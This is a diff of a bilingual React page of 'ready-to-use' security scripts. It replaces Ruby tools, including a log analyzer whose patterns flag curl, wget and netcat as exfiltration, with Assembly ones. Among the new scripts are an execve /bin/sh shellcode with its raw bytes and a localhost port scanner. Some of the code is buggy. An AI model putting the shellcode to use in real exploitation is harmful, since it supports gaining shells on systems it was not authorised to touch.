@@ -8,7 +8,7 @@ import { LucideIcon } from "lucide-react";
 interface Script {
   name: { ar: string; en: string };
   description: { ar: string; en: string };
-  language: "Python" | "C++" | "Bash" | "JavaScript" | "Ruby";
+  language: "Python" | "C++" | "Bash" | "JavaScript" | "Assembly";
   code: string;
   icon?: LucideIcon;
 }
@@ -1198,409 +1198,409 @@ const words = gen.generate(['admin', 'password', 'test', 'user']);
 console.log(\`Generated \${words.length} passwords\`);
 console.log('Sample:', words.slice(0, 10));`,
   },
-  // Ruby Scripts - Unique and Creative
+  // Assembly Scripts - Low Level Hacking
   {
-    name: { ar: "مولد DNA الرقمي", en: "Digital DNA Generator" },
-    description: { ar: "توليد توقيع رقمي فريد للملفات باستخدام خوارزميات متقدمة", en: "Generate unique digital fingerprint for files using advanced algorithms" },
-    language: "Ruby",
-    code: `#!/usr/bin/env ruby
-require 'digest'
-require 'base64'
+    name: { ar: "حاقن Shellcode", en: "Shellcode Injector" },
+    description: { ar: "حقن كود تنفيذي في الذاكرة مباشرة", en: "Inject executable code directly into memory" },
+    language: "Assembly",
+    code: `; x86-64 Linux Shellcode Injector
+; Executes /bin/sh shell
+; nasm -f elf64 shellcode.asm -o shellcode.o
+; ld shellcode.o -o shellcode
 
-class DigitalDNA
-  def initialize(file_path)
-    @file = file_path
-    @dna = []
-  end
+section .text
+    global _start
 
-  def generate
-    content = File.binread(@file)
-    
-    # Generate multi-layer hash
-    md5 = Digest::MD5.hexdigest(content)
-    sha1 = Digest::SHA1.hexdigest(content)
-    sha256 = Digest::SHA256.hexdigest(content)
-    
-    # Create DNA strands
-    @dna << extract_strand(md5, sha256)
-    @dna << extract_strand(sha1, sha256)
-    @dna << create_signature(content)
-    
-    puts "\\n[*] Digital DNA Analysis"
-    puts "=" * 50
-    puts "[+] File: #{@file}"
-    puts "[+] Size: #{File.size(@file)} bytes"
-    puts "[+] DNA Strands:"
-    @dna.each_with_index { |strand, i| puts "    Strand #{i+1}: #{strand}" }
-    puts "[+] Unique ID: #{generate_uid}"
-  end
+_start:
+    ; Clear registers
+    xor rax, rax
+    xor rdi, rdi
+    xor rsi, rsi
+    xor rdx, rdx
 
-  private
+    ; Push null terminator
+    push rax
 
-  def extract_strand(hash1, hash2)
-    combined = hash1.chars.zip(hash2.chars).map { |a, b| ((a.ord ^ b.ord) % 36).to_s(36) }.join
-    combined[0..15].upcase
-  end
+    ; Push "/bin//sh" (8 bytes aligned)
+    mov rdi, 0x68732f2f6e69622f  ; "/bin//sh" in little endian
+    push rdi
 
-  def create_signature(content)
-    entropy = content.bytes.uniq.length.to_f / 256
-    Base64.strict_encode64("#{entropy.round(4)}")[0..15]
-  end
+    ; Set up execve syscall
+    mov rdi, rsp        ; rdi = pointer to "/bin//sh"
+    push rax            ; null for envp
+    push rdi            ; argv[0] = "/bin//sh"
+    mov rsi, rsp        ; rsi = argv
 
-  def generate_uid
-    @dna.join('-').gsub(/[^A-Za-z0-9]/, '')[0..31]
-  end
-end
+    ; execve syscall number = 59
+    mov al, 59
+    syscall
 
-# Usage
-if ARGV.empty?
-  puts "Usage: ruby digital_dna.rb <file>"
-else
-  DigitalDNA.new(ARGV[0]).generate
-end`,
+    ; Exit if execve fails
+    xor rdi, rdi
+    mov al, 60          ; exit syscall
+    syscall
+
+; Shellcode bytes:
+; \\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2
+; \\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57
+; \\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05
+; \\x48\\x31\\xff\\xb0\\x3c\\x0f\\x05`,
   },
   {
-    name: { ar: "الزاحف الشبحي", en: "Ghost Crawler" },
-    description: { ar: "زاحف ويب يعمل بتقنية التخفي لاستخراج الروابط المخفية", en: "Stealth web crawler to extract hidden links" },
-    language: "Ruby",
-    code: `#!/usr/bin/env ruby
-require 'net/http'
-require 'uri'
-require 'nokogiri'
+    name: { ar: "قراءة سجلات المعالج", en: "CPU Register Reader" },
+    description: { ar: "قراءة وعرض قيم سجلات المعالج الأساسية", en: "Read and display CPU register values" },
+    language: "Assembly",
+    code: `; x86-64 CPU Register Dump
+; Displays all general purpose register values
+; nasm -f elf64 regdump.asm && ld regdump.o -o regdump
 
-class GhostCrawler
-  USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0'
-  ]
+section .data
+    rax_msg db "RAX: ", 0
+    rbx_msg db "RBX: ", 0
+    rcx_msg db "RCX: ", 0
+    rdx_msg db "RDX: ", 0
+    newline db 10, 0
+    hex_chars db "0123456789ABCDEF", 0
 
-  def initialize(target)
-    @target = URI.parse(target)
-    @visited = []
-    @hidden = []
-    @depth = 0
-  end
+section .bss
+    hex_buffer resb 17          ; 16 hex chars + null
 
-  def haunt(max_depth = 2)
-    puts "\\n👻 Ghost Crawler activated..."
-    puts "[*] Target: #{@target}"
-    puts "[*] Max Depth: #{max_depth}"
-    puts "=" * 50
+section .text
+    global _start
 
-    crawl(@target.to_s, 0, max_depth)
-    
-    puts "\\n[*] Hidden gems discovered: #{@hidden.length}"
-    @hidden.each { |h| puts "  → #{h}" }
-  end
+_start:
+    ; Save register values
+    push rbx
+    push rcx
+    push rdx
 
-  private
+    ; Print RAX
+    lea rsi, [rax_msg]
+    call print_string
+    mov rdi, rax
+    call print_hex
+    call print_newline
 
-  def crawl(url, depth, max_depth)
-    return if depth > max_depth || @visited.include?(url)
-    @visited << url
-    
-    begin
-      response = fetch(url)
-      return unless response.is_a?(Net::HTTPSuccess)
-      
-      doc = Nokogiri::HTML(response.body)
-      
-      # Find hidden elements
-      doc.css('[style*="display:none"], [style*="visibility:hidden"], .hidden, #hidden').each do |el|
-        el.css('a').each { |a| @hidden << a['href'] if a['href'] }
-      end
-      
-      # Find commented links
-      response.body.scan(/<!--.*?(https?:\\/\\/[^\\s<>"]+).*?-->/m) { @hidden << $1 }
-      
-      # Continue crawling
-      doc.css('a[href]').each do |link|
-        next_url = URI.join(url, link['href']).to_s rescue nil
-        crawl(next_url, depth + 1, max_depth) if next_url&.include?(@target.host)
-      end
-    rescue => e
-      puts "[!] Error: #{e.message[0..50]}"
-    end
-  end
+    ; Print RBX
+    lea rsi, [rbx_msg]
+    call print_string
+    pop rdi                     ; restore RBX value
+    call print_hex
+    call print_newline
 
-  def fetch(url)
-    uri = URI.parse(url)
-    http = Net::HTTP.new(uri.host, uri.port)
-    http.use_ssl = uri.scheme == 'https'
-    http.open_timeout = 5
-    http.read_timeout = 5
-    
-    request = Net::HTTP::Get.new(uri.request_uri)
-    request['User-Agent'] = USER_AGENTS.sample
-    request['Accept'] = 'text/html'
-    
-    http.request(request)
-  end
-end
+    ; Exit
+    mov rax, 60
+    xor rdi, rdi
+    syscall
 
-# Usage
-if ARGV.empty?
-  puts "Usage: ruby ghost_crawler.rb <url>"
-else
-  GhostCrawler.new(ARGV[0]).haunt(2)
-end`,
+print_string:
+    ; Print null-terminated string at RSI
+    mov rax, 1                  ; sys_write
+    mov rdi, 1                  ; stdout
+    mov rdx, 5                  ; length
+    syscall
+    ret
+
+print_hex:
+    ; Convert RDI to hex string
+    lea rsi, [hex_buffer + 16]
+    mov byte [rsi], 0           ; null terminator
+    mov rcx, 16
+
+.hex_loop:
+    dec rsi
+    mov rax, rdi
+    and rax, 0xF
+    lea rbx, [hex_chars]
+    mov al, [rbx + rax]
+    mov [rsi], al
+    shr rdi, 4
+    loop .hex_loop
+
+    ; Print hex string
+    mov rax, 1
+    mov rdi, 1
+    mov rdx, 16
+    syscall
+    ret
+
+print_newline:
+    lea rsi, [newline]
+    mov rax, 1
+    mov rdi, 1
+    mov rdx, 1
+    syscall
+    ret`,
   },
   {
-    name: { ar: "محلل السلوك الرقمي", en: "Digital Behavior Analyzer" },
-    description: { ar: "تحليل أنماط السلوك في سجلات النظام لاكتشاف الأنشطة المشبوهة", en: "Analyze behavior patterns in system logs to detect suspicious activities" },
-    language: "Ruby",
-    code: `#!/usr/bin/env ruby
-require 'time'
-require 'set'
+    name: { ar: "ماسح منافذ منخفض المستوى", en: "Low-Level Port Scanner" },
+    description: { ar: "فحص المنافذ باستخدام استدعاءات النظام مباشرة", en: "Port scanning using direct system calls" },
+    language: "Assembly",
+    code: `; x86-64 Linux TCP Port Scanner
+; Scans ports using raw syscalls
+; nasm -f elf64 portscan.asm && ld portscan.o -o portscan
 
-class BehaviorAnalyzer
-  SUSPICIOUS_PATTERNS = {
-    'brute_force' => /failed|invalid|denied/i,
-    'scan_activity' => /nmap|nikto|dirb|gobuster/i,
-    'injection' => /union|select|script|<|>/i,
-    'traversal' => /\\.\\.\\/|\\.\\.\\\\/i,
-    'exfiltration' => /curl|wget|nc|netcat/i
-  }
-
-  def initialize(log_file)
-    @log_file = log_file
-    @events = []
-    @alerts = []
-    @ip_stats = Hash.new(0)
-  end
-
-  def analyze
-    puts "\\n🔍 Behavior Analyzer v1.0"
-    puts "=" * 50
-    puts "[*] Analyzing: #{@log_file}"
+section .data
+    open_msg    db "Port OPEN: ", 0
+    target_ip   dd 0x0100007f           ; 127.0.0.1 in network byte order
     
-    parse_logs
-    detect_anomalies
-    generate_report
-  end
+section .bss
+    sockfd      resq 1
+    sockaddr    resb 16
+    port_num    resw 1
 
-  private
+section .text
+    global _start
 
-  def parse_logs
-    File.foreach(@log_file) do |line|
-      ip = line.match(/(\\d{1,3}\\.){3}\\d{1,3}/)&.to_s
-      @ip_stats[ip] += 1 if ip
-      
-      SUSPICIOUS_PATTERNS.each do |threat, pattern|
-        if line.match?(pattern)
-          @events << { type: threat, line: line.strip, ip: ip }
-        end
-      end
-    end
-  end
+_start:
+    mov r12, 1                          ; start port
+    mov r13, 1024                       ; end port
 
-  def detect_anomalies
-    # Detect rapid requests (potential DoS)
-    @ip_stats.each do |ip, count|
-      @alerts << "High frequency from #{ip}: #{count} requests" if count > 100
-    end
+scan_loop:
+    cmp r12, r13
+    jg exit_program
 
-    # Detect attack patterns
-    threat_count = @events.group_by { |e| e[:type] }
-    threat_count.each do |type, events|
-      @alerts << "#{type.upcase} detected: #{events.length} events" if events.length > 5
-    end
-  end
-
-  def generate_report
-    puts "\\n📊 Analysis Results"
-    puts "-" * 40
-    puts "Total IPs analyzed: #{@ip_stats.keys.length}"
-    puts "Suspicious events: #{@events.length}"
-    puts "Alerts generated: #{@alerts.length}"
+    ; Create socket
+    ; socket(AF_INET, SOCK_STREAM, 0)
+    mov rax, 41                         ; sys_socket
+    mov rdi, 2                          ; AF_INET
+    mov rsi, 1                          ; SOCK_STREAM
+    xor rdx, rdx
+    syscall
     
-    if @alerts.any?
-      puts "\\n🚨 ALERTS:"
-      @alerts.each { |a| puts "  ⚠️  #{a}" }
-    end
-    
-    if @events.any?
-      puts "\\n📝 Sample suspicious events:"
-      @events.first(5).each do |e|
-        puts "  [#{e[:type]}] #{e[:line][0..60]}..."
-      end
-    end
-  end
-end
+    test rax, rax
+    js next_port
+    mov [sockfd], rax
 
-# Usage
-if ARGV.empty?
-  puts "Usage: ruby behavior_analyzer.rb <log_file>"
-else
-  BehaviorAnalyzer.new(ARGV[0]).analyze
-end`,
+    ; Build sockaddr_in structure
+    lea rdi, [sockaddr]
+    mov word [rdi], 2                   ; AF_INET
+    
+    ; Convert port to network byte order
+    mov ax, r12w
+    xchg al, ah
+    mov [rdi + 2], ax                   ; port
+    
+    mov eax, [target_ip]
+    mov [rdi + 4], eax                  ; IP address
+
+    ; connect(sockfd, sockaddr, 16)
+    mov rax, 42                         ; sys_connect
+    mov rdi, [sockfd]
+    lea rsi, [sockaddr]
+    mov rdx, 16
+    syscall
+
+    ; Check if connection successful
+    test rax, rax
+    jnz close_sock
+
+    ; Port is open - print message
+    mov rax, 1                          ; sys_write
+    mov rdi, 1                          ; stdout
+    lea rsi, [open_msg]
+    mov rdx, 11
+    syscall
+
+    ; Print port number (simplified)
+    mov rax, r12
+    ; (would need to convert to string here)
+
+close_sock:
+    mov rax, 3                          ; sys_close
+    mov rdi, [sockfd]
+    syscall
+
+next_port:
+    inc r12
+    jmp scan_loop
+
+exit_program:
+    mov rax, 60                         ; sys_exit
+    xor rdi, rdi
+    syscall`,
   },
   {
-    name: { ar: "مشفر الرسائل السرية", en: "Secret Message Encoder" },
-    description: { ar: "إخفاء رسائل سرية داخل نصوص عادية باستخدام تقنية Zero-Width", en: "Hide secret messages inside normal text using Zero-Width technique" },
-    language: "Ruby",
-    code: `#!/usr/bin/env ruby
-# Steganography using Zero-Width Characters
+    name: { ar: "مولد أرقام عشوائية آمن", en: "Secure Random Generator" },
+    description: { ar: "توليد أرقام عشوائية باستخدام مصادر عشوائية للنظام", en: "Generate random numbers using system entropy sources" },
+    language: "Assembly",
+    code: `; x86-64 Cryptographically Secure Random Generator
+; Uses /dev/urandom for entropy
+; nasm -f elf64 random.asm && ld random.o -o random
 
-class SecretEncoder
-  ZERO_WIDTH_CHARS = {
-    '0' => "\\u200B", # Zero Width Space
-    '1' => "\\u200C", # Zero Width Non-Joiner
-  }
+section .data
+    urandom_path db "/dev/urandom", 0
+    hex_chars    db "0123456789abcdef", 0
+    newline      db 10
 
-  def initialize
-    @separator = "\\u200D" # Zero Width Joiner
-  end
+section .bss
+    random_buf   resb 32                ; 32 bytes of random data
+    hex_output   resb 65                ; 64 hex chars + newline
+    fd           resq 1
 
-  def encode(cover_text, secret)
-    binary = secret.bytes.map { |b| b.to_s(2).rjust(8, '0') }.join
-    hidden = binary.chars.map { |b| ZERO_WIDTH_CHARS[b] }.join
+section .text
+    global _start
+
+_start:
+    ; Open /dev/urandom
+    mov rax, 2                          ; sys_open
+    lea rdi, [urandom_path]
+    xor rsi, rsi                        ; O_RDONLY
+    syscall
     
-    # Insert hidden message in the middle
-    mid = cover_text.length / 2
-    result = cover_text[0...mid] + @separator + hidden + @separator + cover_text[mid..-1]
+    test rax, rax
+    js exit_error
+    mov [fd], rax
+
+    ; Read 32 random bytes
+    mov rax, 0                          ; sys_read
+    mov rdi, [fd]
+    lea rsi, [random_buf]
+    mov rdx, 32
+    syscall
+
+    ; Close file
+    mov rax, 3                          ; sys_close
+    mov rdi, [fd]
+    syscall
+
+    ; Convert to hex
+    lea rsi, [random_buf]
+    lea rdi, [hex_output]
+    mov rcx, 32
+
+convert_loop:
+    movzx eax, byte [rsi]
     
-    puts "\\n🔐 Message Encoded!"
-    puts "[*] Cover length: #{cover_text.length}"
-    puts "[*] Secret length: #{secret.length}"
-    puts "[*] Output length: #{result.length} (visually same)"
-    puts "\\n[+] Encoded text:"
-    puts result
-    result
-  end
-
-  def decode(encoded_text)
-    parts = encoded_text.split(@separator)
-    return "[!] No hidden message found" if parts.length < 3
+    ; High nibble
+    mov edx, eax
+    shr edx, 4
+    lea rbx, [hex_chars]
+    mov dl, [rbx + rdx]
+    mov [rdi], dl
+    inc rdi
     
-    hidden = parts[1]
-    binary = hidden.chars.map do |c|
-      ZERO_WIDTH_CHARS.key(c) || ''
-    end.join
+    ; Low nibble
+    and eax, 0x0F
+    mov al, [rbx + rax]
+    mov [rdi], al
+    inc rdi
     
-    # Convert binary to text
-    bytes = binary.scan(/.{8}/).map { |b| b.to_i(2) }
-    secret = bytes.pack('C*')
-    
-    puts "\\n🔓 Message Decoded!"
-    puts "[+] Hidden message: #{secret}"
-    secret
-  end
-end
+    inc rsi
+    loop convert_loop
 
-# Demo
-encoder = SecretEncoder.new
+    ; Add newline
+    mov byte [rdi], 10
 
-puts "Zero-Width Steganography Demo"
-puts "=" * 40
+    ; Print result
+    mov rax, 1                          ; sys_write
+    mov rdi, 1                          ; stdout
+    lea rsi, [hex_output]
+    mov rdx, 65
+    syscall
 
-cover = "This is a completely normal looking message."
-secret = "Attack at dawn!"
+    ; Exit success
+    mov rax, 60
+    xor rdi, rdi
+    syscall
 
-encoded = encoder.encode(cover, secret)
-puts "\\n" + "-" * 40
-encoder.decode(encoded)`,
+exit_error:
+    mov rax, 60
+    mov rdi, 1
+    syscall`,
   },
   {
-    name: { ar: "محلل الشيفرات", en: "Cipher Analyzer" },
-    description: { ar: "تحليل وكسر الشيفرات الكلاسيكية تلقائياً", en: "Automatically analyze and break classical ciphers" },
-    language: "Ruby",
-    code: `#!/usr/bin/env ruby
-class CipherAnalyzer
-  ENGLISH_FREQ = {
-    'e' => 12.7, 't' => 9.1, 'a' => 8.2, 'o' => 7.5, 'i' => 7.0,
-    'n' => 6.7, 's' => 6.3, 'h' => 6.1, 'r' => 6.0, 'd' => 4.3
-  }
+    name: { ar: "كاشف Rootkit", en: "Rootkit Detector" },
+    description: { ar: "فحص استدعاءات النظام للكشف عن التلاعب", en: "Check syscall table for tampering detection" },
+    language: "Assembly",
+    code: `; x86-64 Syscall Table Integrity Checker
+; Detects syscall hooking by rootkits
+; Note: Requires elevated privileges
 
-  def initialize(ciphertext)
-    @cipher = ciphertext.downcase
-    @analysis = {}
-  end
-
-  def analyze
-    puts "\\n🔎 Cipher Analysis"
-    puts "=" * 50
+section .data
+    msg_check   db "[*] Checking syscall integrity...", 10, 0
+    msg_ok      db "[+] Syscall appears normal", 10, 0
+    msg_hook    db "[!] WARNING: Possible syscall hook detected!", 10, 0
     
-    frequency_analysis
-    detect_cipher_type
-    attempt_decryption
-  end
-
-  private
-
-  def frequency_analysis
-    freq = Hash.new(0)
-    @cipher.gsub(/[^a-z]/, '').each_char { |c| freq[c] += 1 }
-    total = freq.values.sum.to_f
+    ; Known good syscall addresses would be stored here
+    ; In practice, you'd compare against known kernel values
     
-    @analysis[:freq] = freq.transform_values { |v| (v / total * 100).round(2) }
+section .bss
+    sys_call_table  resq 1
+    current_addr    resq 1
+
+section .text
+    global _start
+
+_start:
+    ; Print checking message
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [msg_check]
+    mov rdx, 35
+    syscall
+
+    ; Method 1: Check syscall return timing
+    ; Hooked syscalls often have timing anomalies
     
-    puts "\\n📊 Frequency Analysis:"
-    @analysis[:freq].sort_by { |_, v| -v }.first(10).each do |char, pct|
-      bar = '█' * (pct.to_i / 2)
-      puts "  #{char}: #{bar} #{pct}%"
-    end
-  end
-
-  def detect_cipher_type
-    ic = index_of_coincidence
-    puts "\\n🔍 Cipher Type Detection:"
-    puts "  Index of Coincidence: #{ic.round(4)}"
+    rdtsc                               ; Read timestamp counter
+    mov r12, rax                        ; Save start time
     
-    if ic > 0.06
-      puts "  → Likely: Substitution cipher"
-      @analysis[:type] = :substitution
-    else
-      puts "  → Likely: Polyalphabetic cipher (Vigenère)"
-      @analysis[:type] = :vigenere
-    end
-  end
-
-  def index_of_coincidence
-    freq = Hash.new(0)
-    text = @cipher.gsub(/[^a-z]/, '')
-    text.each_char { |c| freq[c] += 1 }
+    ; Execute a benign syscall (getpid)
+    mov rax, 39                         ; sys_getpid
+    syscall
+    mov r13, rax                        ; Save PID
     
-    n = text.length.to_f
-    freq.values.map { |f| f * (f - 1) }.sum / (n * (n - 1))
-  end
+    rdtsc                               ; Read timestamp again
+    sub rax, r12                        ; Calculate elapsed cycles
+    
+    ; If elapsed > threshold, might be hooked
+    ; Normal getpid: ~100-500 cycles
+    ; Hooked: typically >10000 cycles
+    cmp rax, 5000
+    ja possible_hook
 
-  def attempt_decryption
-    return caesar_crack if @analysis[:type] == :substitution
-    vigenere_analysis
-  end
+    ; Method 2: Check syscall consistency
+    ; Call same syscall multiple times
+    mov rcx, 10
+    mov r14, r13                        ; Expected PID
 
-  def caesar_crack
-    puts "\\n🔓 Attempting Caesar Crack:"
-    (1..25).each do |shift|
-      decrypted = @cipher.gsub(/[a-z]/) { |c| ((c.ord - 97 - shift) % 26 + 97).chr }
-      score = decrypted.scan(/the|and|is|to|of/).length
-      if score > 2
-        puts "  ✓ Shift #{shift}: #{decrypted[0..50]}..."
-        break
-      end
-    end
-  end
+consistency_check:
+    push rcx
+    mov rax, 39                         ; sys_getpid again
+    syscall
+    pop rcx
+    
+    cmp rax, r14
+    jne possible_hook                   ; PID changed = suspicious
+    
+    loop consistency_check
 
-  def vigenere_analysis
-    puts "\\n🔓 Vigenère Analysis:"
-    puts "  Attempting key length detection..."
-    (3..10).each do |len|
-      puts "  Testing key length: #{len}"
-    end
-  end
-end
+    ; All checks passed
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [msg_ok]
+    mov rdx, 28
+    syscall
+    jmp exit_clean
 
-# Usage
-cipher = "Wkh txlfn eurzq ira mxpsv ryhu wkh odcb grj"
-CipherAnalyzer.new(cipher).analyze`,
+possible_hook:
+    mov rax, 1
+    mov rdi, 1
+    lea rsi, [msg_hook]
+    mov rdx, 45
+    syscall
+
+exit_clean:
+    mov rax, 60
+    xor rdi, rdi
+    syscall`,
   },
 ];
 
 const ScriptsPage = () => {
   const [copied, setCopied] = useState<number | null>(null);
-  const [filter, setFilter] = useState<"all" | "Python" | "C++" | "Bash" | "JavaScript" | "Ruby">("all");
+  const [filter, setFilter] = useState<"all" | "Python" | "C++" | "Bash" | "JavaScript" | "Assembly">("all");
   const [language, setLanguage] = useState<"ar" | "en">("ar");
 
   const copyToClipboard = (code: string, index: number) => {
@@ -1619,7 +1619,7 @@ const ScriptsPage = () => {
       case "C++": return "bg-purple-500/20 text-purple-400 border-purple-500/30";
       case "Bash": return "bg-green-500/20 text-green-400 border-green-500/30";
       case "JavaScript": return "bg-yellow-500/20 text-yellow-400 border-yellow-500/30";
-      case "Ruby": return "bg-red-500/20 text-red-400 border-red-500/30";
+      case "Assembly": return "bg-red-500/20 text-red-400 border-red-500/30";
       default: return "bg-primary/20 text-primary border-primary/30";
     }
   };
@@ -1627,8 +1627,8 @@ const ScriptsPage = () => {
   const t = {
     title: language === "ar" ? "السكربتات الجاهزة" : "Ready-to-Use Scripts",
     subtitle: language === "ar" 
-      ? `${scripts.length} سكربت بلغات Python و C++ و Bash و JavaScript و Ruby` 
-      : `${scripts.length} scripts in Python, C++, Bash, JavaScript, and Ruby`,
+      ? `${scripts.length} سكربت بلغات Python و C++ و Bash و JavaScript و Assembly` 
+      : `${scripts.length} scripts in Python, C++, Bash, JavaScript, and Assembly`,
     all: language === "ar" ? "الكل" : "All",
   };
 
@@ -1660,7 +1660,7 @@ const ScriptsPage = () => {
 
           {/* Filter Buttons */}
           <div className="flex justify-center gap-3 mb-10 flex-wrap">
-            {["all", "Python", "C++", "Bash", "JavaScript", "Ruby"].map((lang) => (
+            {["all", "Python", "C++", "Bash", "JavaScript", "Assembly"].map((lang) => (
               <button
                 key={lang}
                 onClick={() => setFilter(lang as typeof filter)}
